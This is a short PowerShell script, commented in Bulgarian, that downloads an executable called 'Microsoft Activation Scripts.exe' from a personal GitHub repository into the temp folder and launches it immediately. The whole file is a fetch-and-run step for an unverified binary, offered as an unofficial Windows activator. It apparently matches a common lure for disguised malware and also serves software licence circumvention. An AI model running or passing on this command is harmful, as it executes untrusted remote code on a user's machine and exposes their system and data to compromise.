# Изтегляне и незабавно стартиране
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"

# Изтегляне
Invoke-WebRequest -Uri $url -OutFile $tempFile

# Стартиране
Start-Process $tempFile -Wait

